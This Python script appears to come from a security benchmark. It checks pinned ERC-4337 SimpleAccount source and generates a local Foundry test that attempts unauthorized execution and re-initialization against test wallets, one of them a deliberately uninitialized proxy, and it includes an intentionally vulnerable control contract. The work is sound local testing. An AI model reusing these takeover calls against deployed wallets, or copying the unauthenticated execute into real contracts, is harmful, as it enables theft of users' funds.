"""D2.4T: pinned external smart-account source, local EVM witness and controls.

The target was unknown in prior PRISM benches. The *adapter* was written
after source inspection, so results must not be called strict zero-shot.
"""
from __future__ import annotations

import argparse
from hashlib import sha256
import json
from pathlib import Path
import re
import subprocess

from prism.d24t_unseen_wallet_frontier import propose_wallet_frontier


TARGET = "eth-infinitism/account-abstraction"
TARGET_REV = "7af70c8993a6f42973f520ae0752386a5032abe7"
DEPENDENCY = "OpenZeppelin/openzeppelin-contracts"
DEPENDENCY_REV = "dbb6104ce834628e473d2173bbc9d47f81a9eec3"
SOURCE_FILES = ("contracts/samples/SimpleAccount.sol",
                "contracts/samples/SimpleAccountFactory.sol")
ABI = [{"type": "function", "name": n, "inputs": [{"type": x} for x in types]}
       for n, types in (("initialize", ("address",)),
                        ("execute", ("address", "uint256", "bytes")),
                        ("executeBatch", ("address[]", "uint256[]", "bytes[]")),
                        ("owner", ()))]


def _git(repo: Path, *args: str) -> str:
    r = subprocess.run(["git", "-C", str(repo), *args], text=True,
                       capture_output=True, timeout=35, check=False)
    if r.returncode:
        raise ValueError("SOURCE_NOT_ATTESTABLE: " + r.stderr[-200:])
    return r.stdout.strip()


def attest(repo: Path, dependency: Path) -> dict:
    sources = {}
    for checkout, origin, revision, files in (
        (repo, TARGET, TARGET_REV, SOURCE_FILES),
        (dependency, DEPENDENCY, DEPENDENCY_REV,
         ("contracts/proxy/ERC1967/ERC1967Proxy.sol",))):
        if _git(checkout, "rev-parse", "HEAD") != revision:
            raise ValueError("TARGET_OR_DEPENDENCY_REVISION_CHANGED")
        url = _git(checkout, "remote", "get-url", "origin").rstrip("/").removesuffix(".git")
        if not url.lower().endswith("/" + origin.lower()):
            raise ValueError("TARGET_OR_DEPENDENCY_ORIGIN_CHANGED")
        file_hashes = {}
        for file in files:
            b = (checkout / file).read_bytes()
            if len(b) > 250_000:
                raise ValueError("SOURCE_SIZE_BUDGET_EXCEEDED")
            blob = _git(checkout, "rev-parse", revision + ":" + file)
            if _git(checkout, "hash-object", file) != blob:
                raise ValueError("SOURCE_OR_DEPENDENCY_DIRTY")
            file_hashes[file] = {"git_sha1": blob, "sha256": sha256(b).hexdigest()}
        sources[origin] = {"revision": revision, "files": file_hashes}
    return {"original_sources_attested": True, "repositories": sources}


def _write(path: Path, value: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(value, encoding="utf-8")


def _solidity(plans: list[dict]) -> str:
    calls = []
    families = ("direct_execution_without_owner_authorization",
                "batched_execution_without_owner_authorization",
                "repeated_initialization_attempt")
    for i, c in enumerate(plans):
        if c["family"] not in families or c["requested_token_outflow"] not in (1, 1000, 1000000):
            raise ValueError("OUT_OF_SCOPE_ACTION")
        family = families.index(c["family"])
        ready = "true" if c["deployment_state"] == "official_initialized" else "false"
        calls.append(f'''        uint8 outcome{i} = _candidate({ready}, {family}, {c["requested_token_outflow"]});
        if ((outcome{i} & 1) != 0) emit log_string("D24T_ASSET_WITNESS_{i}");
        if ((outcome{i} & 2) != 0) emit log_string("D24T_AUTH_WITNESS_{i}");''')
    return '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;
import "aa/contracts/samples/SimpleAccount.sol";
import "aa/contracts/samples/SimpleAccountFactory.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

interface D24TPrank { function prank(address who) external; }

contract D24TLocalToken {
    mapping(address => uint256) public balanceOf;
    function mintLabOnly(address who, uint256 amount) external { balanceOf[who] += amount; }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "LAB_TOKEN_INSUFFICIENT");
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }
}

// Locally authored independent positive control; NOT third-party source.
contract D24TAuthBypassControl {
    function execute(address to, uint256, bytes calldata data) external {
        (bool ok,) = to.call(data);
        require(ok, "MOCK_CONTROL_CALL_FAILED");
    }
}

contract D24TOriginalAccountNative {
    event log_string(string);
    D24TPrank constant vm = D24TPrank(address(uint160(uint256(keccak256("hevm cheat code")))));
    address constant OWNER = address(0xA11CE);
    address constant ATTACKER = address(0xBADD1E);
    address constant NOT_AN_ENTRYPOINT = address(0xE4337);
    uint256 constant TREASURY = 1000000;

    function _newWallet(bool officialInitialized)
        internal returns (SimpleAccount wallet, D24TLocalToken token)
    {
        // Factory implementation and initializer are part of the exact original.
        SimpleAccountFactory factory = new SimpleAccountFactory(IEntryPoint(NOT_AN_ENTRYPOINT));
        if (officialInitialized) {
            wallet = factory.createAccount(OWNER, 20261027);
            require(wallet.owner() == OWNER, "OFFICIAL_INITIALIZATION_FAILED");
        } else {
            // Counterfactual misdeployment: original implementation but proxy
            // instantiated OUTSIDE the factory with empty initialization data.
            ERC1967Proxy proxy = new ERC1967Proxy(address(factory.accountImplementation()), "");
            wallet = SimpleAccount(payable(address(proxy)));
            require(wallet.owner() == address(0), "UNINITIALIZED_STATE_NOT_REACHED");
        }
        token = new D24TLocalToken();
        token.mintLabOnly(address(wallet), TREASURY);
    }

    function _pay(address to, uint256 amount) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("transfer(address,uint256)", to, amount);
    }

    function _candidate(bool officiallyInitialized, uint8 mode, uint256 amount)
        internal returns (uint8 outcome)
    {
        (SimpleAccount wallet, D24TLocalToken token) = _newWallet(officiallyInitialized);
        bytes memory data = _pay(ATTACKER, amount);
        address oldOwner = wallet.owner();
        if (mode == 0) {
            vm.prank(ATTACKER);
            address(wallet).call(abi.encodeWithSignature(
                "execute(address,uint256,bytes)", address(token), 0, data));
        } else if (mode == 1) {
            address[] memory destinations = new address[](1);
            destinations[0] = address(token);
            bytes[] memory payloads = new bytes[](1);
            payloads[0] = data;
            uint256[] memory zeroValues = new uint256[](0);
            vm.prank(ATTACKER);
            address(wallet).call(abi.encodeWithSignature(
                "executeBatch(address[],uint256[],bytes[])", destinations, zeroValues, payloads));
        } else {
            vm.prank(ATTACKER);
            (bool initialized,) = address(wallet).call(abi.encodeWithSignature(
                "initialize(address)", ATTACKER));
            if (initialized) {
                vm.prank(ATTACKER);
                address(wallet).call(abi.encodeWithSignature(
                    "execute(address,uint256,bytes)", address(token), 0, data));
            }
        }
        if (token.balanceOf(ATTACKER) > 0 &&
            token.balanceOf(address(wallet)) < TREASURY) outcome |= 1;
        if (wallet.owner() != oldOwner) outcome |= 2;
    }

    function test_generated_external_wallet_state_frontier() public {
'''+"\n".join(calls)+'''
        emit log_string("D24T_ALL_GENERATED_EXTERNAL_TRIALS_EXECUTED");
    }

    function test_authorized_owner_control() public {
        (SimpleAccount wallet, D24TLocalToken token) = _newWallet(true);
        vm.prank(OWNER);
        wallet.execute(address(token), 0, _pay(OWNER, 1000));
        require(token.balanceOf(OWNER) == 1000 && token.balanceOf(ATTACKER) == 0,
                "ORIGINAL_AUTHORIZED_CONTROL_FAILED");
        emit log_string("D24T_ORIGINAL_AUTHORIZED_OWNER_CONTROL_SUCCESS");
    }

    function test_explicit_local_vulnerable_control() public {
        D24TLocalToken token = new D24TLocalToken();
        D24TAuthBypassControl bad = new D24TAuthBypassControl();
        token.mintLabOnly(address(bad), TREASURY);
        vm.prank(ATTACKER);
        bad.execute(address(token), 0, _pay(ATTACKER, TREASURY));
        require(token.balanceOf(ATTACKER) == TREASURY,
                "AUTHORED_POSITIVE_CONTROL_NOT_DETECTED");
        emit log_string("D24T_AUTHORED_VULNERABLE_CONTROL_SUCCESS");
    }
}
'''


def prepare(repo: Path, dependency: Path, out: Path) -> dict:
    source = attest(repo, dependency)
    plan = propose_wallet_frontier(ABI)
    if plan["status"] != "SOURCE_INDEPENDENT_HYPOTHESES_PENDING_EVM":
        raise ValueError("REQUIRED_ABI_NOT_SUPPORTED")
    _write(out / "foundry.toml", '''[profile.default]
src = "src"
test = "test"
solc_version = "0.8.23"
optimizer = true
optimizer_runs = 200
via_ir = true
remappings = ["aa/=lib/aa/", "@openzeppelin/contracts/=lib/openzeppelin/contracts/"]
''')
    _write(out / "test" / "D24TOriginalWalletNative.t.sol", _solidity(plan["candidates"]))
    _write(out / "source_attestation.json", json.dumps(source, indent=2, sort_keys=True) + "\n")
    _write(out / "trial_plan.json", json.dumps(plan, indent=2, sort_keys=True) + "\n")
    return {"status": "ORIGINAL_EVM_TRIALS_PENDING",
            "candidates": len(plan["candidates"]), "source": source}


def score(out: Path) -> dict:
    log = (out / "forge-output.txt").read_text()
    must_have = ("D24T_ALL_GENERATED_EXTERNAL_TRIALS_EXECUTED",
                 "D24T_ORIGINAL_AUTHORIZED_OWNER_CONTROL_SUCCESS",
                 "D24T_AUTHORED_VULNERABLE_CONTROL_SUCCESS")
    if "Suite result: ok." not in log or any(log.count(x) != 1 for x in must_have):
        raise ValueError("NATIVE_VERIFICATION_MISSING_OR_INCONSISTENT")
    asset = [int(x) for x in re.findall(r"\bD24T_ASSET_WITNESS_(\d+)\b", log)]
    authority = [int(x) for x in re.findall(r"\bD24T_AUTH_WITNESS_(\d+)\b", log)]
    plan = json.loads((out / "trial_plan.json").read_text())
    max_idx = len(plan["candidates"])
    if (len(set(asset)) != len(asset) or len(set(authority)) != len(authority) or
        any(not 0 <= i < max_idx for i in asset + authority)):
        raise ValueError("MALFORMED_EVM_WITNESS_INDEX")
    official = [i for i in asset if plan["candidates"][i]["deployment_state"] == "official_initialized"]
    unsafe = [i for i in asset if plan["candidates"][i]["deployment_state"] == "proxy_uninitialized"]
    risk = "POTENTIAL_UNEXPECTED_OFFICIAL_FACTORY_OUTFLOW_REQUIRES_INDEPENDENT_TRIAGE" if official else (
        "KNOWN_UNINITIALIZED_PROXY_DEPLOYMENT_RISK_REPRODUCED" if unsafe else
        "NO_ECONOMIC_WITNESSES_IN_BOUNDED_SCENARIOS_UNKNOWN_NOT_SAFE")
    result = {
        "schema": "scm.prism.d24t.external-wallet-reproduction.v1",
        "status": risk,
        "native_evm_executed": True,
        "external_target_version": TARGET_REV,
        "source_verified": True,
        "candidate_count": max_idx,
        "official_factory_asset_witness_indices": official,
        "unsafe_proxy_asset_witness_indices": unsafe,
        "authority_witness_indices": authority,
        "known_misdeployment_is_zero_day": False,
        "adapter_written_after_source_inspection": True,
        "attacker_starting_tokens": 0,
        "actual_transaction_fee_paid_by_attacker_measured": False,
        "zero_actual_expense_verified": False,
        "novel_confirmed_bugs": 0,
        "zero_days": 0,
        "uncovered_family": plan["unsupported_registered_families"],
        "source_attestation": json.loads((out / "source_attestation.json").read_text()),
    }
    _write(out / "result.json", json.dumps(result, indent=2, sort_keys=True) + "\n")
    return result


def main():
    cli = argparse.ArgumentParser()
    cli.add_argument("stage", choices=("prepare", "score"))
    cli.add_argument("--repo", type=Path)
    cli.add_argument("--dependency", type=Path)
    cli.add_argument("--out", type=Path, required=True)
    args = cli.parse_args()
    if args.stage == "prepare":
        if args.repo is None or args.dependency is None:
            cli.error("--repo and --dependency required")
        result = prepare(args.repo, args.dependency, args.out)
    else:
        result = score(args.out)
    print("D24T_" + args.stage.upper(), json.dumps(result, sort_keys=True))


if __name__ == "__main__":
    main()
